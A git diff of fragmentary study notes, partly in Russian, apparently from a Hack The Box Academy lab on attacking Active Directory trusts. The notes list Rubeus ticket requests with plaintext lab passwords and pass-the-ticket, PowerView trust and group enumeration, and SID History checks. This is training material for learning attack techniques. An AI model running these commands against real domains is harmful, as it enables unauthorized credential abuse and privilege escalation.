@@ -279,18 +279,25 @@ PS C:\Tools> .\Rubeus.exe asktgt /user:buster /domain:inlanefreight.ad /password
 
 # За лесом
 Enumerate Users with SIDHistory Enabled
+
 Get-ADUser -Filter * -Server "CHILD-DC.child.inlanefreight.ad"
 
 # 1 Злоупотребление правами иностранных принципалов ACL
+
  Enumerate if SID History is enabled
 
 PS C:\Tools> Import-Module .\PowerView.ps1
+
 PS C:\Tools> Get-DomainTrust -domain logistics.ad
+
 xfreerdp /u:htb-student /p:HTB_@cademy_stdnt /v:10.129.71.9 /dynamic-resolution /drive:share,/home/max/share
 
 ./Rubeus createnetonly /program:powershell.exe /show
+
 .\Rubeus.exe asktgt /user:htb-student /password:HTB_@cademy_stdnt /domain:child.inlanefreight.ad /ptt
+
 Get-ADGroupMember "SVC_ADMINS" -Server INLANEFREIGHT.AD
+
 Get-DomainGroupMember -Identity 'SVC_ADMINS' -Domain inlanefreight.ad -Verbose
 
 для юзера ---
